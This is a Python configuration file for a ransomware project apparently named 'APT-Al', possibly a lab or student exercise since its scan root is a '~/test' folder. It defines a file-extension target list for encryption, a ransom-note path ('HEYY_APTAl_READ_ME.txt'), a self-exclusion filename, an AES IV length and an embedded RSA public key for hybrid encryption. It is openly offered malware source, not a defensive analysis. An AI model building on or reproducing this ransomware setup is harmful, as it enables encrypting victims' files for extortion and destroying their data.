import os
from pwd import getpwuid

who_we_are = "APT-Al"

# prevent self-encryption
what_is_my_name = "zararliyim.exe"
what_is_my_purpose = """\nExplain our aim\n"""

# the beginning point of recon
root_directory = os.path.expanduser('~')
root_directory = os.path.join(root_directory,"test")

# where to write the pairs made up of a file and AES IV
# aesIV_file_store_path = os.path.join(root_directory,"HEYY_APTAl_READ_ME.txt")
aesIV_file_store_path = "/home/kali/Desktop/HEYY_APTAl_READ_ME.txt"

os_name = os.name


# the extensions are ordered so we can use binary search
file_extentions = [ '7z', 'ai', 'aif', 'apk', 'arj', 'asp', 'aspx', 'avi', 
                    'bak', 'bat', 'bin', 'bmp', 'c', 'cab', 'cda', 'cfg', 
                    'cgi', 'class', 'cpp', 'cs', 'css', 'csv', 'dat', 'db', 
                    'dbf', 'deb', 'dmg', 'doc', 'docx', 'eml', 'exe', 'fnt', 
                    'fon', 'htm', 'html', 'ico', 'iso', 'jar', 'java', 'jpeg', 
                    'jpg', 'js', 'json', 'jsp', 'key', 'log', 'mdb', 'mid', 'midi', 
                    'mov', 'mp3', 'mp4', 'mpa', 'mpg', 'msg', 'msi', 'odp', 
                    'ods', 'oft', 'ogg', 'ost', 'pdf', 'php', 'pkg', 'pl', 
                    'png', 'pps', 'ppt', 'pptx', 'py', 'rar', 'rpm', 'rss', 
                    'rtf', 'sh', 'sql', 'svg', 'swift', 'sys', 'tar', 'tif', 
                    'tiff', 'toast', 'txt','vb', 'wav', 'wma', 'wpl', 'wsf', 
                    'xhtml', 'xls', 'xml', 'xslm', 'xslx', 'zip']


aes_IV_key_length = 16
rsa_public_key = "-----BEGIN RSA PUBLIC KEY-----\n\
MIICCgKCAgEAu25ITaLSaYnlJ88w8nWdoJF/q4nrtqH9Iajw1CWlEiSTlUqMy0x+\n\
3uDC29Afv246gSad+fXvS0V22mhnv9ByVk8mTBQCCx7ytR0wLGGSkYl1eSsPAmvV\n\
g59onZgM/aF0vr4MCmYZLqXOabWF6/a8/+qW/v2vA3DJ6ur4N3GEAC26c40YoXqU\n\
nt3Eazzfe5rXMrXPokxaBqfQfzCPVAwwWuTL4VDQINm47cLK4c5RmagQXm3ZvqBg\n\
8j2RMAKZ7xvzw9OCacTEahypcMyyobWSiAsrhNHBl3GsKAne/91LYDmWJUa5tg7q\n\
FBT2M1RvNGezBdV0jDWbUy4KFBS2pr02PWhACLGXZzqAI2isq6fjCJv8tQB7+MWx\n\
fncrreeNQGJ9JqErAZ7IlwlW+NAbn/RQ4OuRLGCIL2IDTkeBN9GKiIqvxOkvtvjR\n\
QKpPHa5tDgMWgmYTsIZrPFUCjbBslQQuYMPLx66rBAr7bNEJZoG4xaAsWHBbvj2r\n\
b4DvLhmsrITAppF9TATh1amnze+Gbupxm68hn+XTecyWFsXz7kIfsycT/OmwW2vm\n\
hjPH7H5Q4TqpxEkDDc3thRcr47wZtiYGeanc/UOsNabxyTahKGPFYooVHaoj9pl5\n\
s+osKiL/Se+8eKHxt9JgP1tUXYMZbfNoo0q0QkIfl3Q8Js+lsOqVP+cCAwEAAQ==\n\
-----END RSA PUBLIC KEY-----"